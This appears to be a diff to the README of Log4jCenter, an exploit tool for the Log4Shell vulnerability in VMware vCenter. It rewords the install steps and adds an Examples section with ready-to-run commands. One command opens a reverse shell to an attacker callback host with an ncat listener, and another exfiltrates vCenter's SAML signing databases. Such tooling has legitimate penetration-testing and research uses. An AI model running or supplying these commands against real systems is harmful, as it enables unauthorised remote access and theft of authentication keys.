@@ -10,11 +10,11 @@ Proof of concepts for this vulnerability are scattered and have to be performed 
 
 # Install
 
+This repository can be used manually or with Docker.
+
 ### Manual install
 
-This repository can be used manually or with Docker. To download and run the exploit manually, execute the following steps:
-
-Ensure that Java and Maven are installed on your attacker host. To do this using apt on Debian based operating systems, run the following command:
+To download and run the exploit manually, execute the following steps. First, ensure that Java and Maven are installed on your attacker host. To do this using apt on Debian based operating systems, run the following command:
 
 ```
 apt update && apt install openjdk-11-jre maven
@@ -47,7 +47,7 @@ git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter \
 To run the container, run a command similar to the following with your command line flags appended. For example, the command below would be used to exploit vCenter and get a reverse shell. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:
 
 ```
-docker run -it -v $(pwd):/Log4jCenter -p 1389:1389 Log4jCenter \ 
+docker run -it -v $(pwd):/Log4jCenter -p 8090:8090 -p 1389:1389 Log4jCenter \ 
     -t 10.100.100.1 -i 192.168.1.1 -p 4444 -r
 ```
 
@@ -65,6 +65,21 @@ optional arguments:
   -p PORT, --port PORT  Callback port for reverse shell.
   -e, --exfiltrate      Module to pull SAML DB
   -r, --revshell        Module to establish reverse shell
+```
+
+# Examples
+
+Get a reverse shell using the tool installed on your local system:
+
+```
+python3 exploit.py -t vcenter.acme.com -i 10.10.10.1 -p 4444 -r
+```
+
+Exfiltrate the SAML signing databases from within a Docker container:
+
+```
+docker run -it -v $(pwd):/Log4jCenter -p 1389:1389 -p 8090:8090 Log4jCenter \
+    -t 10.100.100.1 -i 192.168.1.1 -e
 ```
 
 # Notes
